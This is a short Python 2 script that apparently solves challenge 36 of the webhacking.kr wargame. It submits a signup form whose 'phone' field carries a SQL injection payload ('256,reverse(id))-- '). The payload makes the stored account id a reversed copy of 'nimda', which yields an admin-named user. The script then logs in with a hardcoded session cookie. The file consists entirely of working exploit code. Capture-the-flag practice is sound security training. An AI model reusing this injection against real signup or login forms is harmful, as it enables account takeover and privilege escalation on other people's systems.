#-*- coding: utf-8 -*-
import urllib
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-36/index.php"
CookieManager.addCookie("PHPSESSID", "e52509baa15ced3a5be56d2efc0239b6")

print "[*] Join nimda"
parameters = urllib.urlencode({
    "id": "nimda",
    "phone": "256,reverse(id))-- "
})
httpRequest = urllib2.Request(challengeUrl, parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print "[*] Login nimda"
parameters = urllib.urlencode({
    "lid": "nimda",
    "lphone": "256"
})
httpRequest = urllib2.Request(challengeUrl, parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
